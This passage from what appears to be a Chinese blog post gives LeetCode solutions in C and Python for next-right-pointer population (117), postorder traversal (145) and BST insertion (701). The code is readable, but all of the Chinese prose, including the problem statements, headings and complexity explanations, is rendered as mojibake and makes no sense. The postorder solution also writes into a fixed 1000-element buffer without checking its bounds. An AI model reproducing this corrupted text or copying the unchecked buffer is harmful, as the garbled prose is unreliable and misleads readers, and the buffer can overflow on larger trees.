src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/02/15/117_sample.png" alt="image.png"></p><p>è¾“å…¥ï¼šroot &#x3D; [1,2,3,4,5,null,7]<br>è¾“å‡ºï¼š[1,#,2,3,#,4,5,7,#]<br>è§£é‡Šï¼šç»™å®šäºŒå‰æ ‘å¦‚å›¾ A æ‰€ç¤ºï¼Œä½ çš„å‡½æ•°åº”è¯¥å¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œä»¥æŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œå¦‚å›¾ B æ‰€ç¤ºã€‚</p><p>æç¤ºï¼š</p><p>æ ‘ä¸­çš„èŠ‚ç‚¹æ•°å°äº 6000<br>-100 &lt;&#x3D; node.val &lt;&#x3D; 100</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node-ii">https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node-ii</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h4 id="è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†"><a href="#è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†" class="headerlink" title="è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†"></a>è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†</h4><p>æˆ‘ä»¬è€ƒè™‘åˆ°å½“æˆ‘ä»¬å¡«å……nextæŒ‡é’ˆå°†æ¯ä¸€å±‚çš„ç»“ç‚¹éƒ½è¿æ¥èµ·æ¥åï¼Œ<strong>è¯¥å±‚æ‰€æœ‰ç»“ç‚¹ä¾¿æ„æˆäº†ä¸€ä¸ªå•å‘é“¾è¡¨</strong>ï¼Œæˆ‘ä»¬å¯ä»¥<strong>é€šè¿‡éå†æ¯ä¸€å±‚çš„é“¾è¡¨æ¥æ„é€ ä¸‹ä¸€å±‚çš„é“¾è¡¨</strong></p><p>å¤§è‡´è¿‡ç¨‹å¦‚ä¸‹å›¾</p><p><img src="https://i.loli.net/2020/09/28/485DnfumcRterSM.png" alt="BD12E33FCF6E3B97FC6DB3AF5B645CF2.png"></p><h4 id="æ—¶é—´å¤æ‚åº¦ï¼š-2"><a href="#æ—¶é—´å¤æ‚åº¦ï¼š-2" class="headerlink" title="æ—¶é—´å¤æ‚åº¦ï¼š"></a>æ—¶é—´å¤æ‚åº¦ï¼š</h4><p>ç”±äºæ¯ä¸ªç»“ç‚¹éƒ½è¦éå†ä¸€æ¬¡ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><h4 id="ç©ºé—´å¤æ‚åº¦ï¼š-2"><a href="#ç©ºé—´å¤æ‚åº¦ï¼š-2" class="headerlink" title="ç©ºé—´å¤æ‚åº¦ï¼š"></a>ç©ºé—´å¤æ‚åº¦ï¼š</h4><p>ç”±äºæ²¡æœ‰ä½¿ç”¨åˆ°é¢å¤–çš„ç©ºé—´ï¼Œæ•…ç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>1</strong>)</p><h4 id="Cè¯­è¨€ç‰ˆï¼š-1"><a href="#Cè¯­è¨€ç‰ˆï¼š-1" class="headerlink" title="Cè¯­è¨€ç‰ˆï¼š"></a>Cè¯­è¨€ç‰ˆï¼š</h4><p>æˆ‘ä¹ˆå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a Node.</span></span><br><span class="line"><span class="comment"> * struct Node &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct Node *left;</span></span><br><span class="line"><span class="comment"> *     struct Node *right;</span></span><br><span class="line"><span class="comment"> *     struct Node *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">last_node</span>, *<span class="title">next_start</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">connectList</span><span class="params">(<span class="keyword">struct</span> Node * node)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(last_node)</span><br><span class="line">    &#123;</span><br><span class="line">        last_node-&gt;next = node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!next_start)</span><br><span class="line">    &#123;</span><br><span class="line">        next_start = node;</span><br><span class="line">    &#125;</span><br><span class="line">    last_node = node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Node *<span class="title function_">connect</span><span class="params">(<span class="keyword">struct</span> Node *root)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">start</span> =</span> root;</span><br><span class="line">    <span class="keyword">while</span>(start)</span><br><span class="line">    &#123;</span><br><span class="line">        last_node = <span class="literal">NULL</span>, next_start = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span>(start)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(start-&gt;left)</span><br><span class="line">                connectList(start-&gt;left);</span><br><span class="line">            <span class="keyword">if</span>(start-&gt;right)</span><br><span class="line">                connectList(start-&gt;right);</span><br><span class="line">            start = start-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        start = next_start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/28/tmKaLsnblvDce9H.png" alt="_XU940OX_R1_5XJK_H@N~5I.png"></p><h4 id="Pythonè¯­è¨€ç‰ˆï¼š-2"><a href="#Pythonè¯­è¨€ç‰ˆï¼š-2" class="headerlink" title="Pythonè¯­è¨€ç‰ˆï¼š"></a>Pythonè¯­è¨€ç‰ˆï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node:</span></span><br><span class="line"><span class="string">    def __init__(self, val: int = 0, left: &#x27;Node&#x27; = None, right: &#x27;Node&#x27; = None, next: &#x27;Node&#x27; = None):</span></span><br><span class="line"><span class="string">        self.val = val</span></span><br><span class="line"><span class="string">        self.left = left</span></span><br><span class="line"><span class="string">        self.right = right</span></span><br><span class="line"><span class="string">        self.next = next</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.last_node: <span class="string">&#x27;Node&#x27;</span></span><br><span class="line">        self.next_start: <span class="string">&#x27;Node&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">self, root: <span class="string">&#x27;Node&#x27;</span></span>) -&gt; <span class="string">&#x27;Node&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line">        start = root</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> start != <span class="literal">None</span>:</span><br><span class="line">            self.last_node = <span class="literal">None</span></span><br><span class="line">            self.next_start = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> start != <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> start.left != <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.last_node != <span class="literal">None</span>:</span><br><span class="line">                        self.last_node.<span class="built_in">next</span> = start.left</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> self.next_start == <span class="literal">None</span>:</span><br><span class="line">                        self.next_start = start.left</span><br><span class="line"></span><br><span class="line">                    self.last_node = start.left</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> start.right != <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.last_node != <span class="literal">None</span>:</span><br><span class="line">                        self.last_node.<span class="built_in">next</span> = start.right</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> self.next_start == <span class="literal">None</span>:</span><br><span class="line">                        self.next_start = start.right</span><br><span class="line"></span><br><span class="line">                    self.last_node = start.right</span><br><span class="line"></span><br><span class="line">                start = start.<span class="built_in">next</span></span><br><span class="line"></span><br><span class="line">            start = self.next_start</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">connectList</span>(<span class="params">self, node: <span class="string">&#x27;Node&#x27;</span></span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.last_node != <span class="literal">None</span>:</span><br><span class="line">            self.last_node.<span class="built_in">next</span> = node</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.next_start == <span class="literal">None</span>:</span><br><span class="line">            self.next_start = node</span><br><span class="line"></span><br><span class="line">        self.last_node = node</span><br></pre></td></tr></table></figure><p>![XTJUK27UN3_66_OSL5&#96;_BZB.png](<a href="https://i.loli.net/2020/09/28/ywXFL85CP4Zm2B6.png">https://i.loli.net/2020/09/28/ywXFL85CP4Zm2B6.png</a>)</p><h3 id="29-145-äºŒå‰æ ‘çš„ååºéå†ï¼ˆä¸­ç­‰ï¼‰"><a href="#29-145-äºŒå‰æ ‘çš„ååºéå†ï¼ˆä¸­ç­‰ï¼‰" class="headerlink" title="29 - 145. äºŒå‰æ ‘çš„ååºéå†ï¼ˆä¸­ç­‰ï¼‰"></a>29 - <a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal/">145. äºŒå‰æ ‘çš„ååºéå†ï¼ˆä¸­ç­‰ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œè¿”å›å®ƒçš„ ååº éå†ã€‚</p><p>ç¤ºä¾‹:</p><p>è¾“å…¥: [1,null,2,3]<br>   1<br>    <br>     2<br>    &#x2F;<br>   3 </p><p>è¾“å‡º: [3,2,1]<br>è¿›é˜¶: é€’å½’ç®—æ³•å¾ˆç®€å•ï¼Œä½ å¯ä»¥é€šè¿‡è¿­ä»£ç®—æ³•å®Œæˆå—ï¼Ÿ</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal">https://leetcode-cn.com/problems/binary-tree-postorder-traversal</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h4 id="è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-é€’å½’åç»­éå†"><a href="#è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-é€’å½’åç»­éå†" class="headerlink" title="è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰ + é€’å½’åç»­éå†"></a>è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰ + é€’å½’åç»­éå†</h4><p>ååºéå†çš„é¡ºåºæ˜¯<strong>å·¦â†’å³â†’æ ¹</strong>ï¼Œä½¿ç”¨é€’å½’å¯ä»¥ä¸‰åˆ†é’Ÿå†…è§£å†³</p><h4 id="æ—¶é—´å¤æ‚åº¦ï¼š-3"><a href="#æ—¶é—´å¤æ‚åº¦ï¼š-3" class="headerlink" title="æ—¶é—´å¤æ‚åº¦ï¼š"></a>æ—¶é—´å¤æ‚åº¦ï¼š</h4><p>æ¯ä¸ªç»“ç‚¹éƒ½è¿‡ä¸€éï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦æ˜¯<strong>O</strong>(<strong>N</strong>)</p><h4 id="ç©ºé—´å¤æ‚åº¦ï¼š-3"><a href="#ç©ºé—´å¤æ‚åº¦ï¼š-3" class="headerlink" title="ç©ºé—´å¤æ‚åº¦ï¼š"></a>ç©ºé—´å¤æ‚åº¦ï¼š</h4><p>æ¯ä¸ªç»“ç‚¹éƒ½è¦å¼€è¾Ÿä¸€ä¸ªå•ç‹¬çš„æ ˆå¸§ç©ºé—´ï¼Œæ•…ç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> * retn;</span><br><span class="line"><span class="type">int</span> size;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">        dfs(root-&gt;left);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">        dfs(root-&gt;right);</span><br><span class="line"></span><br><span class="line">    retn[size++] = root-&gt;val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* <span class="title function_">postorderTraversal</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span>* returnSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    retn = (<span class="type">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">1000</span>);</span><br><span class="line">    size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    dfs(root);</span><br><span class="line">    *returnSize = size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/29/Smo2vrKwWfjH1Ta.png" alt="_B35__WY2L_Z`E_`27DA_FM.png"></p><h3 id="30-701-äºŒå‰æœç´¢æ ‘ä¸­çš„æ’å…¥æ“ä½œï¼ˆä¸­ç­‰ï¼‰"><a href="#30-701-äºŒå‰æœç´¢æ ‘ä¸­çš„æ’å…¥æ“ä½œï¼ˆä¸­ç­‰ï¼‰" class="headerlink" title="30 - 701. äºŒå‰æœç´¢æ ‘ä¸­çš„æ’å…¥æ“ä½œï¼ˆä¸­ç­‰ï¼‰"></a>30 - <a href="https://leetcode-cn.com/problems/insert-into-a-binary-search-tree/">701. äºŒå‰æœç´¢æ ‘ä¸­çš„æ’å…¥æ“ä½œï¼ˆä¸­ç­‰ï¼‰</a></h3><blockquote><p>ç»™å®šäºŒå‰æœç´¢æ ‘ï¼ˆBSTï¼‰çš„æ ¹èŠ‚ç‚¹å’Œè¦æ’å…¥æ ‘ä¸­çš„å€¼ï¼Œå°†å€¼æ’å…¥äºŒå‰æœç´¢æ ‘ã€‚ è¿”å›æ’å…¥åäºŒå‰æœç´¢æ ‘çš„æ ¹èŠ‚ç‚¹ã€‚ è¾“å…¥æ•°æ®ä¿è¯ï¼Œæ–°å€¼å’ŒåŸå§‹äºŒå‰æœç´¢æ ‘ä¸­çš„ä»»æ„èŠ‚ç‚¹å€¼éƒ½ä¸åŒã€‚</p><p>æ³¨æ„ï¼Œå¯èƒ½å­˜åœ¨å¤šç§æœ‰æ•ˆçš„æ’å…¥æ–¹å¼ï¼Œåªè¦æ ‘åœ¨æ’å…¥åä»ä¿æŒä¸ºäºŒå‰æœç´¢æ ‘å³å¯ã€‚ ä½ å¯ä»¥è¿”å›ä»»æ„æœ‰æ•ˆçš„ç»“æœã€‚</p><p>ä¾‹å¦‚, </p><p>ç»™å®šäºŒå‰æœç´¢æ ‘:</p><pre><code>    4   / \  2   7 / \1   3</code></pre><p>å’Œ æ’å…¥çš„å€¼: 5<br>ä½ å¯ä»¥è¿”å›è¿™ä¸ªäºŒå‰æœç´¢æ ‘:</p><pre><code>     4   /   \  2     7 / \   /1   3 5</code></pre><p>æˆ–è€…è¿™ä¸ªæ ‘ä¹Ÿæ˜¯æœ‰æ•ˆçš„:</p><pre><code>     5   /   \  2     7 / \   1   3     \      4</code></pre><p>æç¤ºï¼š</p><p>ç»™å®šçš„æ ‘ä¸Šçš„èŠ‚ç‚¹æ•°ä»‹äº 0 å’Œ 10^4 ä¹‹é—´<br>æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€æ•´æ•°å€¼ï¼Œå–å€¼èŒƒå›´ä» 0 åˆ° 10^8<br>-10^8 &lt;&#x3D; val &lt;&#x3D; 10^8<br>æ–°å€¼å’ŒåŸå§‹äºŒå‰æœç´¢æ ‘ä¸­çš„ä»»æ„èŠ‚ç‚¹å€¼éƒ½ä¸åŒ</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/insert-into-a-binary-search-tree">https://leetcode-cn.com/problems/insert-into-a-binary-search-tree</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h4 id="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-1"><a href="#è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-1" class="headerlink" title="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"></a>è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰</h4><p>æ·±åº¦ä¼˜å…ˆæœç´¢éå†è¿™æ£µæ ‘ï¼Œ <strong>æ’å…¥å€¼å¤§äºç»“ç‚¹å€¼åˆ™å¾€å³å­æ ‘æ’ï¼Œå¦åˆ™å¾€å·¦å­æ ‘æ’</strong></p><p><strong>é€’å½’</strong>å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è§£å†³è¿™ä¸ªé—®é¢˜</p><h4 id="æ—¶é—´å¤æ‚åº¦ï¼š-4"><a href="#æ—¶é—´å¤æ‚åº¦ï¼š-4" class="headerlink" title="æ—¶é—´å¤æ‚åº¦ï¼š"></a>æ—¶é—´å¤æ‚åº¦ï¼š</h4><p>æ¯ä¸ªç»“ç‚¹éƒ½æœ‰å¯èƒ½è¿‡ä¸€éï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦æ˜¯<strong>O</strong>(<strong>N</strong>)</p><h4 id="ç©ºé—´å¤æ‚åº¦ï¼š-4"><a href="#ç©ºé—´å¤æ‚åº¦ï¼š-4" class="headerlink" title="ç©ºé—´å¤æ‚åº¦ï¼š"></a>ç©ºé—´å¤æ‚åº¦ï¼š</h4><p>æ¯ä¸ªç»“ç‚¹éƒ½è¦å¼€è¾Ÿä¸€ä¸ªå•ç‹¬çš„æ ˆå¸§ç©ºé—´ï¼Œæ•…ç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(val &gt; root-&gt;val)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!root-&gt;right)</span><br><span class="line">        &#123;</span><br><span class="line">            root-&gt;right = (<span class="keyword">struct</span> TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TreeNode));</span><br><span class="line">            root-&gt;right-&gt;val = val;</span><br><span class="line">            root-&gt;right-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">            root-&gt;right-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            dfs(root-&gt;right, val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!root-&gt;left)</span><br><span class="line">        &#123;</span><br><span class="line">            root-&gt;left = (<span class="keyword">struct</span> TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TreeNode));</span><br><span class="line">            root-&gt;left-&gt;val = val;</span><br><span class="line">            root-&gt;left-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">            root-&gt;left-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            dfs(root-&gt;left, val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">insertIntoBST</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        root = (<span class="keyword">struct</span> TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TreeNode));</span><br><span class="line">        root-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">        root-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">        root-&gt;val = val;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(root, val);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>![Z08G_KN_4GTD1&#96;J_3NC0__F.png](<a href="https://i.loli.net/2020/09/30/EUIqglNFiRvJCoz.png">https://i.loli.net/2020/09/30/EUIqglNFiRvJCoz.png</a>)</p><blockquote><p>åˆæ˜¯èƒ½å¤Ÿæ—©ç¡çš„ä¸€ä¸ªæ™šä¸Šï¼ˆç¡®ä¿¡</p><p>ä¹æœˆç»“æŸğŸŒ¶</p></blockquote><h2 id="October"><a href="#October" class="headerlink" title="October"></a>October</h2><h3 